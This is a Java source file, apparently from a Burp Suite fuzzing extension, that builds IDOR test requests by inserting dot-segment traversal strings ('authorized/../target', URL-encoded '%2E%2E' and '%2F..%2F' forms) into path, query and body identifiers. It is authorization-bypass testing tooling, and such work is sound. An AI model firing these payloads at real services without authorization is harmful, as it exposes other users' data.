package com.bypassfuzzer.burp.core.idor.playbooks;

import burp.api.montoya.http.message.requests.HttpRequest;
import com.bypassfuzzer.burp.core.idor.IdorRequestContext;
import com.bypassfuzzer.burp.http.LocatedParameter;
import com.bypassfuzzer.burp.http.RequestParameterSupport;

import java.util.ArrayList;
import java.util.List;

/**
 * PLAYBOOK: idor.path.dot_segments
 * Try dot-segment traversal patterns that start from the authorized identifier and walk to the target identifier.
 */
public class DotSegmentTraversalPlaybook implements IdorPlaybook {

    @Override
    public String id() {
        return "idor.path.dot_segments";
    }

    @Override
    public String displayName() {
        return "Dot Segment Traversal";
    }

    @Override
    public String description() {
        return "Try authorized-id/../target-id style dot-segment variants in discovered path and body identifier locations.";
    }

    @Override
    public List<IdorRequestVariant> buildVariants(IdorRequestContext context) {
        HttpRequest targetRequest = context.targetRequest();
        String authorizedIdentifier = context.authorizedIdentifier();
        String targetIdentifier = context.targetIdentifier();
        if (authorizedIdentifier.isEmpty() || targetIdentifier.isEmpty()) {
            return List.of();
        }

        List<IdorRequestVariant> variants = new ArrayList<>();
        addPathVariants(context, variants, targetRequest, authorizedIdentifier, targetIdentifier);
        addQueryVariants(context, variants, targetRequest, authorizedIdentifier, targetIdentifier);
        addBodyVariants(context, variants, targetRequest, authorizedIdentifier, targetIdentifier);
        return variants;
    }

    private static void addPathVariants(IdorRequestContext context,
                                        List<IdorRequestVariant> variants,
                                        HttpRequest targetRequest,
                                        String authorizedIdentifier,
                                        String targetIdentifier) {
        String targetPath = targetRequest.path();
        if (!context.hasPathIdentifier()
            || targetPath == null || targetPath.isEmpty()
            || !targetPath.contains(targetIdentifier)) {
            return;
        }

        IdorPlaybookSupport.addPathVariant(
            variants,
            targetRequest,
            IdorPlaybookSupport.replaceFirst(targetPath, targetIdentifier, authorizedIdentifier + "/../" + targetIdentifier),
            "authorized/../target"
        );
        IdorPlaybookSupport.addPathVariant(
            variants,
            targetRequest,
            IdorPlaybookSupport.replaceFirst(targetPath, targetIdentifier, authorizedIdentifier + "/%2E%2E/" + targetIdentifier),
            "authorized/%2E%2E/target"
        );
        IdorPlaybookSupport.addPathVariant(
            variants,
            targetRequest,
            IdorPlaybookSupport.replaceFirst(targetPath, targetIdentifier, authorizedIdentifier + "%2F..%2F" + targetIdentifier),
            "authorized%2F..%2Ftarget"
        );
    }

    private static void addQueryVariants(IdorRequestContext context,
                                         List<IdorRequestVariant> variants,
                                         HttpRequest targetRequest,
                                         String authorizedIdentifier,
                                         String targetIdentifier) {
        if (!context.hasQueryIdentifier()) {
            return;
        }

        // Dot-segment traversal inside the query parameter VALUE:
        // ?id=wiener/../carlos  tests if the resolver normalizes the value.
        List<String> traversalValues = List.of(
            authorizedIdentifier + "/../" + targetIdentifier,
            authorizedIdentifier + "/%2E%2E/" + targetIdentifier,
            authorizedIdentifier + "%2F..%2F" + targetIdentifier,
            targetIdentifier + "/../" + targetIdentifier,
            "../" + targetIdentifier,
            "%2E%2E/" + targetIdentifier
        );

        for (LocatedParameter parameter : context.queryIdentifiers()) {
            for (String value : traversalValues) {
                String updatedPath = com.bypassfuzzer.burp.http.QueryStringUtils.upsertDecodedParameter(
                    targetRequest.path(), parameter.name(), value
                );
                variants.add(new IdorRequestVariant(
                    "query " + parameter.name() + " -> " + value,
                    targetRequest.withPath(updatedPath)
                ));
            }
        }
    }

    private static void addBodyVariants(IdorRequestContext context,
                                        List<IdorRequestVariant> variants,
                                        HttpRequest targetRequest,
                                        String authorizedIdentifier,
                                        String targetIdentifier) {
        if (!context.hasBodyIdentifier()) {
            return;
        }

        for (LocatedParameter parameter : context.bodyIdentifiers()) {
            addBodyVariant(variants, targetRequest, parameter, authorizedIdentifier + "/../" + targetIdentifier, "body " + parameter.path() + " authorized/../target");
            addBodyVariant(variants, targetRequest, parameter, authorizedIdentifier + "/%2E%2E/" + targetIdentifier, "body " + parameter.path() + " authorized/%2E%2E/target");
            addBodyVariant(variants, targetRequest, parameter, authorizedIdentifier + "%2F..%2F" + targetIdentifier, "body " + parameter.path() + " authorized%2F..%2Ftarget");
        }
    }

    private static void addBodyVariant(List<IdorRequestVariant> variants,
                                       HttpRequest targetRequest,
                                       LocatedParameter parameter,
                                       String replacement,
                                       String label) {
        HttpRequest updated = RequestParameterSupport.replaceParameterValue(targetRequest, parameter, replacement);
        if (!updated.bodyToString().equals(targetRequest.bodyToString())) {
            variants.add(new IdorRequestVariant(label, updated));
        }
    }
}
